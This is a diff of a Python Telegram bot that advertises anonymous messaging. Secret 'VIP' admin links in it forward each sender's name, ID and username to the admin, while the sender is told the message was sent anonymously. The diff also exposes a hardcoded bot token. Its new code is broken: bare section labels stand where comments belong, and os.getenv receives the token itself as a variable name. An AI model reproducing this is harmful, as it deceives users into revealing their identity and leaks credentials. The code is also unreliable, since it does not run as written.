@@ -1,42 +1,35 @@
 import sqlite3
 import time
+import os
 
 from aiogram import Bot, Dispatcher, executor, types
-from aiogram.types import InlineKeyboardMarkup
-from aiogram.types import InlineKeyboardButton
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# =====================================
-# НАСТРОЙКИ
-# =====================================
-import os
-TOKEN = "8714853815:AAGHOAzbFKDO6yUM7B0SVOaqAB5IAqpywsM"
+# =====================
+TOKEN
+# =====================
+TOKEN = os.getenv("8714853815:AAGHOAzbFKDO6yUM7B0SVOaqAB5IAqpywsM")
 
-# ID админов
+# =====================
+ADMINS
+# =====================
 ADMIN_IDS = [
     8490781536,
     222222222
 ]
 
-# СЕКРЕТНЫЕ ССЫЛКИ АДМИНОВ
 VIP_REFS = {
-    "kx92la": 8490781536C:\Users\akano\PycharmProjects\anon_bot,
+    "kx92la": 8490781536,
     "mv81qp": 222222222
 }
 
-# =====================================
-# BOT
-# =====================================
-
 bot = Bot(token=TOKEN)
-
 dp = Dispatcher(bot)
 
-# =====================================
-# DATABASE
-# =====================================
-
-conn = sqlite3.connect("database.db")
-
+# =====================
+DB
+# =====================
+conn = sqlite3.connect("database.db", check_same_thread=False)
 cursor = conn.cursor()
 
 cursor.execute("""
@@ -46,239 +39,124 @@ CREATE TABLE IF NOT EXISTS users (
     first_name TEXT
 )
 """)
-
 conn.commit()
 
-# =====================================
-# ANTISPAM
-# =====================================
-
+# =====================
+DATA
+# =====================
 last_messages = {}
-
-# =====================================
-# USER TARGETS
-# =====================================
-
 user_targets = {}
 
-# =====================================
-# START
-# =====================================
-
+# =====================
+START
+# =====================
 @dp.message_handler(commands=["start"])
 async def start(message: types.Message):
 
     user = message.from_user
 
     cursor.execute("""
-    INSERT OR REPLACE INTO users
-    (user_id, username, first_name)
+    INSERT OR REPLACE INTO users (user_id, username, first_name)
     VALUES (?, ?, ?)
-    """, (
-        user.id,
-        user.username,
-        user.first_name
-    ))
+    """, (user.id, user.username, user.first_name))
 
     conn.commit()
 
     args = message.get_args()
 
-    # =====================================
-    # ЕСЛИ ОТКРЫЛИ ССЫЛКУ
-    # =====================================
-
     if args:
-
         kb = InlineKeyboardMarkup()
+        kb.add(InlineKeyboardButton(
+            "✍️ Написать сообщение",
+            callback_data=f"write_{args}"
+        ))
 
-        kb.add(
-            InlineKeyboardButton(
-                "📩 Написать сообщение",
-                callback_data=f"write_{args}"
-            )
-        )
-
-        await message.answer(
-            "📩 Отправь анонимное сообщение",
-            reply_markup=kb
-        )
-
+        await message.answer("Отправь сообщение 👇", reply_markup=kb)
         return
-
-    # =====================================
-    # ГЛАВНОЕ МЕНЮ
-    # =====================================
 
     bot_info = await bot.get_me()
 
-    user_link = (
-        f"https://t.me/"
-        f"{bot_info.username}"
-        f"?start={user.id}"
-    )
+    link = f"https://t.me/{bot_info.username}?start={user.id}"
 
     text = f"""
-👋 Привет
+👋 Привет!
 
-Вот твоя анонимная ссылка:
-
-{user_link}
-
-Отправь её друзьям 👀
-
-Когда тебе напишут —
-автор будет скрыт.
+Твоя анонимная ссылка:
+{link}
 """
 
-    # =====================================
-    # VIP ССЫЛКА ДЛЯ АДМИНА
-    # =====================================
-
-    for ref_code, admin_id in VIP_REFS.items():
-
+    # VIP ссылки
+    for code, admin_id in VIP_REFS.items():
         if user.id == admin_id:
-
-            admin_link = (
-                f"https://t.me/"
-                f"{bot_info.username}"
-                f"?start={ref_code}"
-            )
-
-            text += f"""
-
-🔥 Твоя секретная ссылка:
-
-{admin_link}
-
-По ней ты видишь:
-- ID автора
-- username
-- имя
-"""
+            vip_link = f"https://t.me/{bot_info.username}?start={code}"
+            text += f"\n🔥 VIP ссылка:\n{vip_link}"
 
     await message.answer(text)
 
-# =====================================
-# WRITE BUTTON
-# =====================================
-
+# =====================
+WRITE BUTTON
+# =====================
 @dp.callback_query_handler(lambda c: c.data.startswith("write_"))
-async def write_message(call: types.CallbackQuery):
-
+async def write(call: types.CallbackQuery):
     target = call.data.split("_", 1)[1]
-
     user_targets[call.from_user.id] = target
+    await call.message.answer("✍️ Пиши сообщение")
 
-    await call.message.answer(
-        "✍️ Напиши сообщение:"
-    )
-
-# =====================================
-# MESSAGE HANDLER
-# =====================================
-
+# =====================
+MESSAGE HANDLER
+# =====================
 @dp.message_handler(content_types=types.ContentTypes.TEXT)
-async def messages(message: types.Message):
+async def handle(message: types.Message):
 
     user = message.from_user
 
-    # ignore commands
     if message.text.startswith("/"):
         return
 
-    # если нет активной отправки
     if user.id not in user_targets:
         return
 
-    # =====================================
-    # ANTISPAM
-    # =====================================
-
     now = time.time()
 
-    if user.id in last_messages:
-
-        if now - last_messages[user.id] < 3:
-
-            await message.answer(
-                "⏳ Подожди немного"
-            )
-
-            return
+    if user.id in last_messages and now - last_messages[user.id] < 3:
+        await message.answer("⏳ Подожди немного")
+        return
 
     last_messages[user.id] = now
 
     target = user_targets[user.id]
 
-    # =====================================
-    # VIP СООБЩЕНИЕ
-    # =====================================
-
+    # VIP режим
     if target in VIP_REFS:
-
-        username = (
-            f"@{user.username}"
-            if user.username else "нет"
-        )
-
-        text = f"""
-📩 Новое сообщение
-
-👤 Имя:
-{user.first_name}
-
-🆔 ID:
-{user.id}
-
-📎 Username:
-{username}
-
-💬 Сообщение:
-{message.text}
-"""
 
         admin_id = VIP_REFS[target]
 
-        await bot.send_message(
-            admin_id,
-            text
-        )
+        text = f"""
+🔥 VIP сообщение
 
-    # =====================================
-    # ОБЫЧНАЯ АНОНИМКА
-    # =====================================
+👤 {user.first_name}
+🆔 {user.id}
+@{user.username if user.username else "no_username"}
+
+💬 {message.text}
+"""
+
+        await bot.send_message(admin_id, text)
 
     else:
-
         try:
             target_id = int(target)
-
         except:
             return
 
-        text = f"""
-📩 Новое анонимное сообщение
+        await bot.send_message(target_id, f"💬 {message.text}")
 
-💬 Текст:
-{message.text}
-"""
-
-        await bot.send_message(
-            target_id,
-            text
-        )
-
-    await message.answer(
-        "✅ Сообщение отправлено анонимно"
-    )
+    await message.answer("✅ Отправлено анонимно")
 
     del user_targets[user.id]
 
-# =====================================
-# RUN
-# =====================================
-
+# =====================
+RUN
+# =====================
 print("BOT STARTED")
-
 executor.start_polling(dp)
